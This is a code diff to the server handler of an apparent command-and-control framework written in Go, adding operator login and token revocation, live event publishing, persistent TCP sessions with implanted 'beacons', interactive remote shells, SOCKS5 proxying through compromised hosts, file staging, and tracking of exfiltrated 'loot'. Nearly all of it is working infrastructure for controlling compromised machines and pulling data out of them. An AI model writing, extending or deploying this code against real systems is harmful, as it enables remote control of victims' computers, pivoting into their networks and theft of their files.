@@ -15,18 +15,20 @@ import (
 	"path/filepath"
 	"strconv"
 	"strings"
+	"sync"
 	"time"
 
+	"c2/auth"
 	"c2/builder"
 	"c2/models"
 	"c2/protocol"
 	"c2/store"
+	"golang.org/x/time/rate"
 )
 
 type saver interface {
 	SaveListeners([]*models.Listener)
 	SaveBeacons([]*models.Beacon)
-	SaveResults(map[uint32][]*models.Result)
 	SaveEvents([]*models.Event)
 	SaveTerminals(map[uint32]*models.TerminalState)
 	SaveLoot([]*models.ExfilEntry)
@@ -34,22 +36,81 @@ type saver interface {
 }
 
 type Handler struct {
-	store          *store.Store
-	privKey        *rsa.PrivateKey
-	beaconSrc      string // empty = build disabled
-	lm             listenerStarter
-	p              saver
-	managementPort int
+	store           *store.Store
+	privKey         *rsa.PrivateKey
+	beaconSrc       string // empty = build disabled
+	lm              listenerStarter
+	p               saver
+	managementPort  int
+	sessionListener *SessionListener
+	hub             *Hub
+	socksMgr        *SocksManager
+	authSvc         *auth.Auth
+	jwtKey          []byte
+	chatLimitersMu  sync.Mutex
+	chatLimiters    map[string]*rate.Limiter
 }
 
-func NewHandler(s *store.Store, privKey *rsa.PrivateKey, beaconSrc string, lm listenerStarter, p saver, managementPort int) *Handler {
-	return &Handler{store: s, privKey: privKey, beaconSrc: beaconSrc, lm: lm, p: p, managementPort: managementPort}
+func NewHandler(s *store.Store, privKey *rsa.PrivateKey, beaconSrc string, lm listenerStarter, p saver, managementPort int, sl *SessionListener, hub *Hub, socksMgr *SocksManager, authSvc *auth.Auth, jwtKey []byte) *Handler {
+	return &Handler{store: s, privKey: privKey, beaconSrc: beaconSrc, lm: lm, p: p, managementPort: managementPort, sessionListener: sl, hub: hub, socksMgr: socksMgr, authSvc: authSvc, jwtKey: jwtKey, chatLimiters: make(map[string]*rate.Limiter)}
 }
 
 func (h *Handler) logEvent(evType, msg string) {
 	evt := &models.Event{Type: evType, Message: msg, Timestamp: time.Now()}
 	h.store.AddEvent(evt)
 	h.p.SaveEvents(h.store.ListEvents())
+	h.hub.Publish("events", "add", evt)
+}
+
+func (h *Handler) HandleLogin(w http.ResponseWriter, r *http.Request) {
+	var req struct {
+		Username string `json:"username"`
+		Password string `json:"password"`
+	}
+	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
+		http.Error(w, "bad JSON", http.StatusBadRequest)
+		return
+	}
+	if !h.authSvc.ValidatePassword(req.Username, req.Password) {
+		http.Error(w, "invalid credentials", http.StatusUnauthorized)
+		return
+	}
+	token, err := auth.SignToken(req.Username, h.jwtKey)
+	if err != nil {
+		http.Error(w, "internal error", http.StatusInternalServerError)
+		return
+	}
+	h.logEvent("auth", fmt.Sprintf("operator '%s' logged in", req.Username))
+	w.Header().Set("Content-Type", "application/json")
+	json.NewEncoder(w).Encode(struct {
+		Token string `json:"token"`
+	}{Token: token})
+}
+
+func (h *Handler) HandleLogout(w http.ResponseWriter, r *http.Request) {
+	token := r.Header.Get("Authorization")
+	if !strings.HasPrefix(token, "Bearer ") {
+		http.Error(w, "unauthorized", http.StatusUnauthorized)
+		return
+	}
+	raw := token[7:]
+	username, err := auth.ValidateToken(raw, h.jwtKey)
+	if err != nil {
+		http.Error(w, "unauthorized", http.StatusUnauthorized)
+		return
+	}
+	auth.RevokeToken(raw, h.jwtKey)
+	h.logEvent("auth", fmt.Sprintf("operator '%s' logged out", username))
+	w.WriteHeader(http.StatusNoContent)
+}
+
+func StartTokenPurge() {
+	go func() {
+		for {
+			time.Sleep(15 * time.Minute)
+			auth.PurgeExpiredTokens()
+		}
+	}()
 }
 
 // newBeaconMux returns a mux with only the beacon protocol routes.
@@ -105,6 +166,18 @@ func (h *Handler) HandleRegister(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 	h.p.SaveBeacons(h.store.ListBeacons())
+	beacon := h.store.GetBeacon(meta.ID)
+	h.hub.Publish("sessions", "add", map[string]interface{}{
+		"id": meta.ID, "hostname": meta.Hostname, "username": meta.Username,
+		"process_name": meta.ProcessName, "process_id": meta.ProcessID,
+		"arch": meta.Arch, "platform": meta.Platform, "integrity": meta.Integrity,
+		"sleep": meta.Sleep, "jitter": meta.Jitter,
+		"first_seen": beacon.FirstSeen.Unix(), "last_seen": beacon.LastSeen.Unix(),
+		"alive": true, "listener_id": meta.ListenerID, "listener_name": func() string {
+			if l := h.store.GetListener(meta.ListenerID); l != nil { return l.Name }
+			return "Unknown"
+		}(), "mode": "beacon", "shell_active": false,
+	})
 	h.logEvent("new", fmt.Sprintf("new session #%d %s %s", meta.ID, meta.Hostname, meta.Username))
 	w.WriteHeader(http.StatusOK)
 }
@@ -124,6 +197,7 @@ func (h *Handler) HandleCheckin(w http.ResponseWriter, r *http.Request) {
 	}
 
 	h.store.UpdateLastSeen(beaconID)
+	h.hub.Publish("sessions", "checkin", map[string]interface{}{"id": beaconID})
 	h.p.SaveBeacons(h.store.ListBeacons())
 
 	tasks := h.store.DrainPendingTasks(beaconID)
@@ -162,6 +236,9 @@ func (h *Handler) HandleCheckin(w http.ResponseWriter, r *http.Request) {
 			interval := binary.LittleEndian.Uint32(task.Data[:4])
 			jitter := binary.LittleEndian.Uint32(task.Data[4:8])
 			h.store.UpdateBeaconSleep(beaconID, interval, jitter)
+			h.hub.Publish("sessions", "update", map[string]interface{}{
+				"id": beaconID, "sleep": interval, "jitter": jitter,
+			})
 			h.store.StoreResult(&models.Result{
 				Label:      task.Label,
 				BeaconID:   beaconID,
@@ -171,13 +248,16 @@ func (h *Handler) HandleCheckin(w http.ResponseWriter, r *http.Request) {
 			})
 			h.store.MarkTaskDone(task.Label)
 			h.p.SaveBeacons(h.store.ListBeacons())
-			h.p.SaveResults(h.store.AllResults())
+			h.hub.Publish("results", "add", map[string]interface{}{
+				"label": task.Label, "beacon_id": beaconID, "output": fmt.Sprintf("sleep=%ds jitter=%d%%", interval, jitter),
+				"received_at": time.Now().Unix(), "type": protocol.TaskSet,
+			})
 		}
 
 		if task.Type == protocol.TaskExit {
 			h.store.DeleteBeacon(beaconID)
+			h.hub.Publish("sessions", "delete", map[string]interface{}{"id": beaconID})
 			h.p.SaveBeacons(h.store.ListBeacons())
-			h.p.SaveResults(h.store.AllResults())
 		}
 	}
 }
@@ -197,6 +277,7 @@ func (h *Handler) HandleResult(w http.ResponseWriter, r *http.Request) {
 	}
 
 	h.store.UpdateLastSeen(beaconID)
+	h.hub.Publish("sessions", "checkin", map[string]interface{}{"id": beaconID})
 	h.p.SaveBeacons(h.store.ListBeacons())
 
 	plaintext, err := protocol.Decrypt(beacon.SessionKey, body[4:])
@@ -235,11 +316,14 @@ func (h *Handler) HandleResult(w http.ResponseWriter, r *http.Request) {
 					ReceivedAt: time.Now(),
 				})
 				h.store.MarkTaskDone(hdr.Label)
-				h.p.SaveResults(h.store.AllResults())
 				w.WriteHeader(http.StatusOK)
 				return
 			}
 			h.store.MarkExfilDone(hdr.Label, filename, beaconID, int64(len(assembled)))
+			h.hub.Publish("loot", "add", map[string]interface{}{
+				"label": hdr.Label, "filename": filename, "beacon_id": beaconID,
+				"size": int64(len(assembled)), "exfil_at": time.Now().Unix(),
+			})
 			h.logEvent("exfil", fmt.Sprintf("file exfiltrated from #%d: %s (%d bytes)", beaconID, filename, len(assembled)))
 			h.store.StoreResult(&models.Result{
 				Label:      hdr.Label,
@@ -249,8 +333,11 @@ func (h *Handler) HandleResult(w http.ResponseWriter, r *http.Request) {
 				ReceivedAt: time.Now(),
 			})
 			h.store.MarkTaskDone(hdr.Label)
-			h.p.SaveResults(h.store.AllResults())
 			h.p.SaveLoot(h.store.ListExfilFiles())
+			h.hub.Publish("results", "add", map[string]interface{}{
+				"label": hdr.Label, "beacon_id": beaconID, "type": protocol.TaskFileExfil,
+				"filename": filename, "output": "", "received_at": time.Now().Unix(),
+			})
 		}
 	} else if hdr.Type == protocol.TaskFileStage {
 		output, _ := protocol.DecodeRunRep(plaintext[16:])
@@ -264,7 +351,10 @@ func (h *Handler) HandleResult(w http.ResponseWriter, r *http.Request) {
 			ReceivedAt: time.Now(),
 		})
 		h.store.MarkTaskDone(hdr.Label)
-		h.p.SaveResults(h.store.AllResults())
+		h.hub.Publish("results", "add", map[string]interface{}{
+			"label": hdr.Label, "beacon_id": beaconID, "type": protocol.TaskFileStage,
+			"flags": hdr.Flags, "output": output, "received_at": time.Now().Unix(),
+		})
 	} else {
 		output, _ := protocol.DecodeRunRep(plaintext[16:])
 		h.store.StoreResult(&models.Result{
@@ -275,7 +365,10 @@ func (h *Handler) HandleResult(w http.ResponseWriter, r *http.Request) {
 			ReceivedAt: time.Now(),
 		})
 		h.store.MarkTaskDone(hdr.Label)
-		h.p.SaveResults(h.store.AllResults())
+		h.hub.Publish("results", "add", map[string]interface{}{
+			"label": hdr.Label, "beacon_id": beaconID, "flags": hdr.Flags,
+			"output": output, "received_at": time.Now().Unix(),
+		})
 	}
 
 	w.WriteHeader(http.StatusOK)
@@ -291,10 +384,11 @@ func (h *Handler) saveExfilFile(label uint32, filename string, data []byte) erro
 
 func (h *Handler) HandleQueueTask(w http.ResponseWriter, r *http.Request) {
 	var req struct {
-		BeaconID uint32 `json:"beacon_id"`
-		Type     uint8  `json:"type"`
-		Code     uint8  `json:"code"`
-		Args     string `json:"args"`
+		BeaconID  uint32 `json:"beacon_id"`
+		Type      uint8  `json:"type"`
+		Code      uint8  `json:"code"`
+		Args      string `json:"args"`
+		Transport string `json:"transport"`
 	}
 	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
 		http.Error(w, "bad JSON", http.StatusBadRequest)
@@ -334,7 +428,8 @@ func (h *Handler) HandleQueueTask(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 	label := binary.LittleEndian.Uint32(labelBytes[:])
-	h.store.QueueTask(&models.Task{
+
+	task := &models.Task{
 		Label:     label,
 		BeaconID:  req.BeaconID,
 		Type:      req.Type,
@@ -342,9 +437,76 @@ func (h *Handler) HandleQueueTask(w http.ResponseWriter, r *http.Request) {
 		Data:      data,
 		Status:    models.TaskStatusPending,
 		CreatedAt: time.Now(),
-	})
+	}
 
-	h.logEvent("task", fmt.Sprintf("task queued #%d type=%d args=%s", req.BeaconID, req.Type, req.Args))
+	// TaskShellStart: embed session listener port, send via session TCP if
+	// beacon is in session mode, otherwise queue for HTTP checkin.
+	if req.Type == protocol.TaskShellStart && h.sessionListener != nil {
+		portLE := make([]byte, 2)
+		binary.LittleEndian.PutUint16(portLE, uint16(h.sessionListener.Port))
+		data = portLE
+		task.Data = portLE
+		if h.store.IsSession(req.BeaconID) {
+			taskMsg := protocol.EncodeHeader(protocol.TaskHeader{
+				Type:   req.Type,
+				Code:   req.Code,
+				Label:  label,
+				Length: uint32(len(data)),
+			})
+			taskMsg = append(taskMsg, data...)
+			if err := h.sessionListener.SendTask(req.BeaconID, taskMsg); err != nil {
+				h.store.QueueTask(task)
+			} else {
+				task.Status = models.TaskStatusSent
+				h.store.QueueTask(task)
+			}
+		} else {
+			h.store.QueueTask(task)
+		}
+	} else if h.sessionListener != nil && (req.Type == protocol.TaskShellInput || req.Type == protocol.TaskShellStop) && h.store.IsShell(req.BeaconID) {
+		// Route shell input/stop to the dedicated shell TCP connection
+		taskMsg := protocol.EncodeHeader(protocol.TaskHeader{
+			Type:   req.Type,
+			Code:   req.Code,
+			Label:  label,
+			Length: uint32(len(data)),
+		})
+		taskMsg = append(taskMsg, data...)
+		if err := h.sessionListener.SendShellTask(req.BeaconID, taskMsg); err != nil {
+			h.store.QueueTask(task)
+		} else {
+			task.Status = models.TaskStatusSent
+			h.store.QueueTask(task)
+		}
+	} else if req.Transport != "http" && h.sessionListener != nil && h.store.IsSession(req.BeaconID) {
+		taskMsg := protocol.EncodeHeader(protocol.TaskHeader{
+			Type:   req.Type,
+			Code:   req.Code,
+			Label:  label,
+			Length: uint32(len(data)),
+		})
+		taskMsg = append(taskMsg, data...)
+		if err := h.sessionListener.SendTask(req.BeaconID, taskMsg); err != nil {
+			h.store.QueueTask(task)
+		} else {
+			task.Status = models.TaskStatusSent
+			h.store.QueueTask(task)
+			if req.Type == protocol.TaskSet && req.Code == 0 && len(data) >= 8 {
+				interval := binary.LittleEndian.Uint32(data[:4])
+				jitter := binary.LittleEndian.Uint32(data[4:8])
+				h.store.UpdateBeaconSleep(req.BeaconID, interval, jitter)
+				h.hub.Publish("sessions", "update", map[string]interface{}{
+					"id": req.BeaconID, "sleep": interval, "jitter": jitter,
+				})
+				h.p.SaveBeacons(h.store.ListBeacons())
+			}
+		}
+	} else {
+		h.store.QueueTask(task)
+	}
+
+	operator, _ := r.Context().Value(operatorKey).(string)
+	h.logEvent("task", fmt.Sprintf("operator '%s' queued task #%d type=%d args=%s", operator, req.BeaconID, req.Type, req.Args))
 
 	w.Header().Set("Content-Type", "application/json")
 	json.NewEncoder(w).Encode(struct {
@@ -364,11 +526,17 @@ func (h *Handler) HandleGetSessions(w http.ResponseWriter, r *http.Request) {
 		Platform     uint8  `json:"platform"`
 		Integrity    uint8  `json:"integrity"`
 		Sleep        uint32 `json:"sleep"`
+		Jitter       uint32 `json:"jitter"`
 		FirstSeen    int64  `json:"first_seen"`
 		LastSeen     int64  `json:"last_seen"`
 		Alive        bool   `json:"alive"`
 		ListenerID   uint32 `json:"listener_id"`
 		ListenerName string `json:"listener_name"`
+		Mode         string `json:"mode"`
+		ShellActive  bool   `json:"shell_active"`
+		SocksActive  bool   `json:"socks_active"`
+		SocksHost    string `json:"socks_host,omitempty"`
+		SocksPort    int    `json:"socks_port,omitempty"`
 	}
 	resp := make([]item, len(beacons))
 	for i, b := range beacons {
@@ -386,11 +554,32 @@ func (h *Handler) HandleGetSessions(w http.ResponseWriter, r *http.Request) {
 			Platform:     b.Platform,
 			Integrity:    b.Integrity,
 			Sleep:        b.Sleep,
+			Jitter:       b.Jitter,
 			FirstSeen:    b.FirstSeen.Unix(),
 			LastSeen:     b.LastSeen.Unix(),
-			Alive:        b.IsAlive(),
+			Alive:        b.IsAlive() || h.store.IsSession(b.ID),
 			ListenerID:   b.ListenerID,
 			ListenerName: lName,
+			Mode: func() string {
+				if h.store.IsSession(b.ID) {
+					return "session"
+				}
+				return "beacon"
+			}(),
+			ShellActive: h.store.IsShell(b.ID),
+			SocksActive: h.store.HasSocksProxy(b.ID),
+			SocksHost: func() string {
+				if p := h.store.GetSocksProxy(b.ID); p != nil {
+					return p.Host
+				}
+				return ""
+			}(),
+			SocksPort: func() int {
+				if p := h.store.GetSocksProxy(b.ID); p != nil {
+					return p.Port
+				}
+				return 0
+			}(),
 		}
 	}
 	w.Header().Set("Content-Type", "application/json")
@@ -445,10 +634,11 @@ func (h *Handler) HandleBuild(w http.ResponseWriter, r *http.Request) {
 	}
 
 	var req struct {
-		ListenerID uint32 `json:"listener_id"`
-		SleepMS    int    `json:"sleep_ms"`
-		JitterPct  int    `json:"jitter_pct"`
-		Format     string `json:"format"`
+		ListenerID  uint32 `json:"listener_id"`
+		SleepMS     int    `json:"sleep_ms"`
+		JitterPct   int    `json:"jitter_pct"`
+		Format      string `json:"format"`
+		SessionPort int    `json:"session_port"`
 	}
 	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
 		http.Error(w, "bad JSON", http.StatusBadRequest)
@@ -474,6 +664,7 @@ func (h *Handler) HandleBuild(w http.ResponseWriter, r *http.Request) {
 		UseHTTPS:         l.Scheme == "https",
 		IgnoreCertErrors: l.AutoCert,
 		Format:           req.Format,
+		SessionPort:      req.SessionPort,
 	})
 	if err != nil {
 		http.Error(w, err.Error(), http.StatusUnprocessableEntity)
@@ -591,7 +782,12 @@ func (h *Handler) HandleCreateListener(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 	h.p.SaveListeners(h.store.ListListeners())
-	h.logEvent("listener", fmt.Sprintf("listener created: %s %s://:%d", l.Name, l.Scheme, l.Port))
+	h.hub.Publish("listeners", "add", map[string]interface{}{
+		"id": l.ID, "name": l.Name, "scheme": l.Scheme, "host": l.Host,
+		"bind_addr": l.BindAddr, "port": l.Port, "auto_cert": l.AutoCert,
+	})
+	op, _ := r.Context().Value(operatorKey).(string)
+	h.logEvent("listener", fmt.Sprintf("operator '%s' created listener: %s %s://:%d", op, l.Name, l.Scheme, l.Port))
 
 	w.Header().Set("Content-Type", "application/json")
 	w.WriteHeader(http.StatusCreated)
@@ -622,8 +818,10 @@ func (h *Handler) HandleDeleteListener(w http.ResponseWriter, r *http.Request) {
 		http.Error(w, "stop failed: "+err.Error(), http.StatusInternalServerError)
 		return
 	}
-	h.logEvent("listener", fmt.Sprintf("listener deleted: %s #%d", l.Name, id))
+	op, _ := r.Context().Value(operatorKey).(string)
+	h.logEvent("listener", fmt.Sprintf("operator '%s' deleted listener: %s #%d", op, l.Name, id))
 	h.store.RemoveListener(id)
+	h.hub.Publish("listeners", "delete", map[string]interface{}{"id": id})
 	h.p.SaveListeners(h.store.ListListeners())
 	w.WriteHeader(http.StatusNoContent)
 }
@@ -690,7 +888,7 @@ func (h *Handler) HandleUpload(w http.ResponseWriter, r *http.Request) {
 			data = append(data, pathBytes...)
 		}
 		data = append(data, chunk...)
-		h.store.QueueTask(&models.Task{
+		task := &models.Task{
 			BeaconID:   beaconID,
 			Type:       protocol.TaskFileStage,
 			Code:       0,
@@ -699,7 +897,21 @@ func (h *Handler) HandleUpload(w http.ResponseWriter, r *http.Request) {
 			Identifier: chunkIndex,
 			Data:       data,
 			Status:     models.TaskStatusPending,
-		})
+		}
+		if h.sessionListener != nil && h.store.IsSession(beaconID) {
+			taskMsg := protocol.EncodeHeader(protocol.TaskHeader{
+				Type:       protocol.TaskFileStage,
+				Flags:      flags,
+				Label:      label,
+				Identifier: chunkIndex,
+				Length:     uint32(len(data)),
+			})
+			taskMsg = append(taskMsg, data...)
+			if err := h.sessionListener.SendTask(beaconID, taskMsg); err == nil {
+				task.Status = models.TaskStatusSent
+			}
+		}
+		h.store.QueueTask(task)
 		chunkIndex++
 	}
 
@@ -769,6 +981,7 @@ func (h *Handler) HandleDeleteFile(w http.ResponseWriter, r *http.Request) {
 		ui.Errorf("loot", "remove %s: %v", diskPath, err)
 	}
 	h.store.DeleteExfilFile(label)
+	h.hub.Publish("loot", "delete", map[string]interface{}{"label": label})
 	h.p.SaveLoot(h.store.ListExfilFiles())
 	w.WriteHeader(http.StatusNoContent)
 }
@@ -788,30 +1001,46 @@ func (h *Handler) HandleKillBeacon(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
-	if !b.IsAlive() {
-		h.logEvent("kill", fmt.Sprintf("removed dead beacon #%d %s", beaconID, b.Hostname))
+	if !b.IsAlive() && !h.store.IsSession(beaconID) {
+		op, _ := r.Context().Value(operatorKey).(string)
+		h.logEvent("kill", fmt.Sprintf("operator '%s' removed dead beacon #%d %s", op, beaconID, b.Hostname))
 		h.store.DeleteBeacon(beaconID)
+		h.hub.Publish("sessions", "delete", map[string]interface{}{"id": beaconID})
+		h.store.RemoveSession(beaconID)
 		h.p.SaveBeacons(h.store.ListBeacons())
-		h.p.SaveResults(h.store.AllResults())
 		w.WriteHeader(http.StatusNoContent)
 		return
 	}
 
-	h.logEvent("kill", fmt.Sprintf("kill sent #%d %s", beaconID, b.Hostname))
+	op, _ := r.Context().Value(operatorKey).(string)
+	h.logEvent("kill", fmt.Sprintf("operator '%s' kill sent #%d %s", op, beaconID, b.Hostname))
 
 	var killLabelBytes [4]byte
 	if _, err := rand.Read(killLabelBytes[:]); err != nil {
 		http.Error(w, "internal error", http.StatusInternalServerError)
 		return
 	}
-	h.store.QueueTask(&models.Task{
-		Label:     binary.LittleEndian.Uint32(killLabelBytes[:]),
+	label := binary.LittleEndian.Uint32(killLabelBytes[:])
+	task := &models.Task{
+		Label:     label,
 		BeaconID:  beaconID,
 		Type:      protocol.TaskExit,
 		Code:      protocol.CodeExitNormal,
 		Status:    models.TaskStatusPending,
 		CreatedAt: time.Now(),
-	})
+	}
+
+	if h.sessionListener != nil && h.store.IsSession(beaconID) {
+		taskMsg := protocol.EncodeHeader(protocol.TaskHeader{
+			Type: protocol.TaskExit,
+			Code: protocol.CodeExitNormal,
+			Label: label,
+		})
+		if err := h.sessionListener.SendTask(beaconID, taskMsg); err == nil {
+			task.Status = models.TaskStatusSent
+		}
+	}
+	h.store.QueueTask(task)
 
 	w.WriteHeader(http.StatusNoContent)
 }
@@ -836,6 +1065,7 @@ func (h *Handler) HandlePostEvent(w http.ResponseWriter, r *http.Request) {
 		Timestamp: time.Now(),
 	}
 	h.store.AddEvent(evt)
+	h.hub.Publish("events", "add", evt)
 	h.p.SaveEvents(h.store.ListEvents())
 	w.Header().Set("Content-Type", "application/json")
 	json.NewEncoder(w).Encode(evt)
@@ -870,3 +1100,228 @@ func (h *Handler) HandlePutTerminal(w http.ResponseWriter, r *http.Request) {
 	h.p.SaveTerminals(h.store.ListTerminals())
 	w.WriteHeader(http.StatusNoContent)
 }
+
+func (h *Handler) HandleInteractive(w http.ResponseWriter, r *http.Request) {
+	var req struct {
+		BeaconID uint32 `json:"beacon_id"`
+		Port     uint16 `json:"port"`
+	}
+	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
+		http.Error(w, "bad JSON", http.StatusBadRequest)
+		return
+	}
+	beacon := h.store.GetBeacon(req.BeaconID)
+	if beacon == nil {
+		http.Error(w, "unknown beacon", http.StatusNotFound)
+		return
+	}
+	if h.store.IsSession(req.BeaconID) {
+		http.Error(w, "beacon already in session mode", http.StatusConflict)
+		return
+	}
+
+	// Use the listener's public host — same IP the beacon was built with
+	host := ""
+	if l := h.store.GetListener(beacon.ListenerID); l != nil {
+		host = l.Host
+	}
+	if host == "" {
+		http.Error(w, "cannot determine beacon's server host", http.StatusInternalServerError)
+		return
+	}
+
+	data := protocol.EncodeInteractiveReq(host, req.Port)
+	var labelBytes [4]byte
+	rand.Read(labelBytes[:])
+	label := binary.LittleEndian.Uint32(labelBytes[:])
+
+	h.store.QueueTask(&models.Task{
+		Label:     label,
+		BeaconID:  req.BeaconID,
+		Type:      protocol.TaskInteractive,
+		Code:      0,
+		Data:      data,
+		Status:    models.TaskStatusPending,
+		CreatedAt: time.Now(),
+	})
+
+	op, _ := r.Context().Value(operatorKey).(string)
+	h.logEvent("task", fmt.Sprintf("operator '%s' requested interactive for #%d", op, req.BeaconID))
+	w.Header().Set("Content-Type", "application/json")
+	json.NewEncoder(w).Encode(struct {
+		Label uint32 `json:"label"`
+	}{Label: label})
+}
+
+func (h *Handler) HandleCloseSession(w http.ResponseWriter, r *http.Request) {
+	id64, err := strconv.ParseUint(r.PathValue("id"), 10, 32)
+	if err != nil {
+		http.Error(w, "invalid id", http.StatusBadRequest)
+		return
+	}
+	beaconID := uint32(id64)
+	if h.sessionListener == nil || !h.store.IsSession(beaconID) {
+		http.Error(w, "no active session", http.StatusNotFound)
+		return
+	}
+	h.sessionListener.CloseSession(beaconID)
+	op, _ := r.Context().Value(operatorKey).(string)
+	h.logEvent("session", fmt.Sprintf("operator '%s' closed session #%d", op, beaconID))
+	w.WriteHeader(http.StatusNoContent)
+}
+
+func (h *Handler) HandleStartSocks(w http.ResponseWriter, r *http.Request) {
+	var req struct {
+		BeaconID uint32 `json:"beacon_id"`
+		Port     int    `json:"port"`
+		Bind     string `json:"bind"`
+	}
+	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
+		http.Error(w, "bad JSON", http.StatusBadRequest)
+		return
+	}
+
+	beacon := h.store.GetBeacon(req.BeaconID)
+	if beacon == nil {
+		http.Error(w, "unknown beacon", http.StatusNotFound)
+		return
+	}
+	if !h.store.IsSession(req.BeaconID) {
+		http.Error(w, "beacon not in session mode", http.StatusConflict)
+		return
+	}
+	if h.socksMgr == nil {
+		http.Error(w, "socks manager not available", http.StatusInternalServerError)
+		return
+	}
+
+	// Send TaskSocksStart to beacon via session TCP
+	// data = 2-byte LE session listener port
+	portLE := make([]byte, 2)
+	if h.sessionListener != nil {
+		binary.LittleEndian.PutUint16(portLE, uint16(h.sessionListener.Port))
+	}
+	var labelBytes [4]byte
+	rand.Read(labelBytes[:])
+	label := binary.LittleEndian.Uint32(labelBytes[:])
+
+	taskMsg := protocol.EncodeHeader(protocol.TaskHeader{
+		Type:   protocol.TaskSocksStart,
+		Label:  label,
+		Length: 2,
+	})
+	taskMsg = append(taskMsg, portLE...)
+	if err := h.sessionListener.SendTask(req.BeaconID, taskMsg); err != nil {
+		http.Error(w, "failed to send task to beacon: "+err.Error(), http.StatusInternalServerError)
+		return
+	}
+
+	host, port, err := h.socksMgr.StartProxy(req.BeaconID, req.Port, req.Bind)
+	if err != nil {
+		http.Error(w, err.Error(), http.StatusConflict)
+		return
+	}
+
+	op, _ := r.Context().Value(operatorKey).(string)
+	h.logEvent("socks", fmt.Sprintf("operator '%s' started SOCKS5 proxy for #%d on %s:%d", op, req.BeaconID, host, port))
+
+	h.hub.Publish("socks", "started", map[string]interface{}{
+		"beacon_id": req.BeaconID,
+		"host":      host,
+		"port":      port,
+	})
+
+	w.Header().Set("Content-Type", "application/json")
+	w.WriteHeader(http.StatusCreated)
+	json.NewEncoder(w).Encode(map[string]interface{}{
+		"beacon_id": req.BeaconID,
+		"host":      host,
+		"port":      port,
+		"status":    "active",
+	})
+}
+
+func (h *Handler) HandleStopSocks(w http.ResponseWriter, r *http.Request) {
+	id64, err := strconv.ParseUint(r.PathValue("id"), 10, 32)
+	if err != nil {
+		http.Error(w, "invalid id", http.StatusBadRequest)
+		return
+	}
+	beaconID := uint32(id64)
+
+	if h.socksMgr == nil {
+		http.Error(w, "socks manager not available", http.StatusInternalServerError)
+		return
+	}
+
+	// Send TaskSocksStop to beacon if session is active
+	if h.sessionListener != nil && h.store.IsSession(beaconID) {
+		var labelBytes [4]byte
+		rand.Read(labelBytes[:])
+		label := binary.LittleEndian.Uint32(labelBytes[:])
+		taskMsg := protocol.EncodeHeader(protocol.TaskHeader{
+			Type:  protocol.TaskSocksStop,
+			Label: label,
+		})
+		h.sessionListener.SendTask(beaconID, taskMsg) // best-effort
+	}
+
+	h.socksMgr.StopProxy(beaconID)
+	op, _ := r.Context().Value(operatorKey).(string)
+	h.logEvent("socks", fmt.Sprintf("operator '%s' stopped SOCKS5 proxy for #%d", op, beaconID))
+	h.hub.Publish("socks", "stopped", map[string]interface{}{
+		"beacon_id": beaconID,
+	})
+	w.WriteHeader(http.StatusNoContent)
+}
+
+func (h *Handler) HandleListSocks(w http.ResponseWriter, r *http.Request) {
+	if h.socksMgr == nil {
+		w.Header().Set("Content-Type", "application/json")
+		json.NewEncoder(w).Encode([]interface{}{})
+		return
+	}
+
+	proxies := h.store.ListSocksProxies()
+	type item struct {
+		BeaconID     uint32 `json:"beacon_id"`
+		Host         string `json:"host"`
+		Port         int    `json:"port"`
+		ChannelCount int    `json:"channel_count"`
+		Status       string `json:"status"`
+	}
+	resp := make([]item, len(proxies))
+	for i, p := range proxies {
+		p.Mu.RLock()
+		chanCount := len(p.Channels)
+		p.Mu.RUnlock()
+		resp[i] = item{
+			BeaconID:     p.BeaconID,
+			Host:         p.Host,
+			Port:         p.Port,
+			ChannelCount: chanCount,
+			Status:       "active",
+		}
+	}
+	w.Header().Set("Content-Type", "application/json")
+	json.NewEncoder(w).Encode(resp)
+}
+
+// chatRateLimit applies a per-operator token bucket: burst of 10, then 1 message/second sustained.
+// Returns true if the message is allowed, false if the operator has
+// exceeded their quota.
+func (h *Handler) chatRateLimit(username string) bool {
+	h.chatLimitersMu.Lock()
+	defer h.chatLimitersMu.Unlock()
+	if h.chatLimiters == nil {
+		h.chatLimiters = make(map[string]*rate.Limiter)
+	}
+	lim, ok := h.chatLimiters[username]
+	if !ok {
+		// Burst of 10, then 1 token/second sustained.
+		lim = rate.NewLimiter(rate.Every(time.Second), 10)
+		h.chatLimiters[username] = lim
+	}
+	return lim.Allow()
+}
+
